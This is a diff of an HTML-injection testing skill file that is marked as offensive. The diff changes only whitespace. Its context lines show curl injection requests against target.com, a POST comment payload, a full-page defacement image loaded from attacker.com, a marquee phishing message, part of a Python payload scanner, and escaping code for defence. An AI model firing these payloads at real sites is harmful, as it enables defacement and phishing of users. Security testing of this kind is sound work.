@@ -1,4 +1,4 @@
-﻿---
+---
 name: html-injection-testing
 description: "Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms."
 risk: offensive
@@ -127,6 +127,7 @@ Test with simple HTML tags:
 
 Testing workflow:
 ```bash
+
 # Test basic injection
 curl "http://target.com/search?q=<h1>Test</h1>"
 
@@ -177,6 +178,7 @@ http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</m
 Payload in POST data:
 
 ```bash
+
 # POST injection test
 curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
      http://target.com/submit
@@ -252,7 +254,7 @@ Website appearance manipulation:
 </body>
 
 <!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg" 
+<img src="http://attacker.com/defaced.jpg"
      style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
 
 <!-- Marquee injection (visible movement) -->
@@ -386,7 +388,7 @@ payloads = [
 for payload in payloads:
     encoded = urllib.parse.quote(payload)
     url = f"{target}?{param}={encoded}"
-    
+
     try:
         response = requests.get(url, timeout=5)
         if payload.lower() in response.text.lower():
@@ -413,6 +415,7 @@ echo strip_tags($user_input, '<p><b><i>');
 ```
 
 ```python
+
 # Python: HTML escape
 from html import escape
 safe_output = escape(user_input)
